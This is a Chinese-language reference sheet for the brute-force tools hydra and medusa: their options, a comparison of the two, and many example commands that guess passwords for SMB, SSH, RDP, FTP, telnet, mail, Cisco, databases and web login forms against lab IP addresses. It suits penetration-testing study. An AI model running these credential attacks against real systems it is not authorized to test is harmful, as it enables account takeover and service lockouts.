### hydra与medusa比较

```
----hydra----
稳定性差，程序时常崩溃
速度控制不好，容易触发服务器屏蔽或锁死机制
每主机新建进程，没服务新建实例
大量目标破解时性能差
----medusa----
稳定性好
速度控制得当
基于线程
支持模块少于hydra(不支持rdp 远程桌面)
WEB-Form支持存在缺陷
```

### hydra选项

```
`-l LOGIN 指定破解的用户名称，对特定用户破解。``-L FILE 从文件中加载用户名进行破解。``-p PASS小写p指定密码破解，少用，一般是采用密码字典。``-P FILE 大写字母P，指定密码字典。``-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。``-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。``-t TASKS 同时运行的连接的线程数，每一台主机默认为16。``-M FILE 指定服务器目标列表文件一行一条``-w TIME 设置最大超时的时间，单位秒，默认是30s。``-o FILE 指定结果输出文件。``-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。``-v / -V 显示详细过程。``-R 继续从上一次进度接着破解。``-S 采用SSL链接。``-s PORT 可通过这个参数指定非默认端口。``-U       服务模块使用细节``-h       更多的命令行选项（完整的帮助）``server    目标服务器名称或者IP（使用这个或-M选项）``service   指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等``OPT       一些服务模块支持额外的输入（-U用于模块的帮助）`
```

### hydra爆破实例

1）破解windows 密码

```
hydra -l administrator -P password.txt 192.168.79.138 smb
```

2）破解linux密码

```
hydra -l root -P password.txt 192.168.79.138 ssh
hydra -L users.txt -P password.txt -t 5 -vV -o ssh.txt -e ns 192.168.79.138 ssh
```

3）破解ftp（21端口）

```
hydra -l root -P password.txt -t 5 -vV -o ftp.txt -e ns 192.168.79.138 ftp
```

4）破解teamspeak

```
hydra -l admin -P passworrd.txt -s 端口号 -vV 192.168.79.138 teamspeak
```

5）破解rdp（3389端口）

```
hydra -l（这是小写L） administrator -P password.txt -V 192.168.79.138 rdp
```

6）破解telnet

```
hydra -l root -P password.txt  192.168.79.138 telnet
```

7）破解https

```
`hydra -m /index.php -l muts -P pass.txt ip https`
```

8）破解http-proxy

```
hydra -l admin -P passwprd.txt http-proxy://192.168.0.132
```

9）破解imap

```
hydra -L user.txt -p secret 192.168.0.132 imap PLAIN
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```

10）破解cisco

```
hydra -P password.txt 192.168.0.132 cisco
hydra -m cloud -P password.txt 192.168.0.132 cisco-enable
```

11）破解pop3

```
hydra -l root -P password.txt my.pop3.mail pop3
```

12）破解web登录，get方式提交

//如果知道用户名用-l 如果不知道可以使用-L 

```
hydra -L user.txt -p password.txt -t 线程 -vV -e ns ip http-get /admin/
hydra -l admin -p password.txt -t 线程 -vV -e ns -f ip http-get /admin/index.php
```

13）破解web登录，post方式提交

```
hydra -l admin -P password.txt -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>"
参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解，<title>中的内容是表示错误猜解的返回信息提示。
hydra -l admin -p password 192.168.14.159 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=index.php" -V -t 1
```

### medusa选项

```
-h [TEXT]      目标IP
-H [FILE]      目标主机文件
-u [TEXT]      用户名
-U [FILE]      用户名文件
-p [TEXT]      密码
-P [FILE]      密码文件
-C [FILE]      组合条目文件
-O [FILE]      文件日志信息
-e [n/s/ns]    N意为空密码，S意为密码与用户名相同
-M [TEXT]      模块执行名称
-m [TEXT]      传递参数到模块
-d             显示所有的模块名称
-n [NUM]       使用非默认端口
-s             启用SSL
-r [NUM]       重试间隔时间，默认为3秒
-t [NUM]       设定线程数量
-L             并行化，每个用户使用一个线程
-f             在任何主机上找到第一个账号/密码后，停止破解
-q             显示模块的使用信息
-v [NUM]       详细级别（0-6）
-w [NUM]       错误调试级别（0-10）
-V             显示版本
-Z [TEXT]      继续扫描上一次
Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare), 
NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP 
(AUTH/VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC的密码爆破工具。
```

### medusa爆破实例

1）爆破ssh

```
medusa -H ip.txt -u root -P password.txt -M ssh -O good.txt -T 10 -n 22 
medusa -H ip.txt -U user.txt -P password.txt -M ssh -O good.txt -T 10 -n 22 -v 4 -f -R 1 
```

2）爆破postgresql

```
medusa -H ip.txt -u postgres -P password.txt -e ns -M postgres -T 255 -n 5432 -f -O /tmp/good.txt -r 0
```





























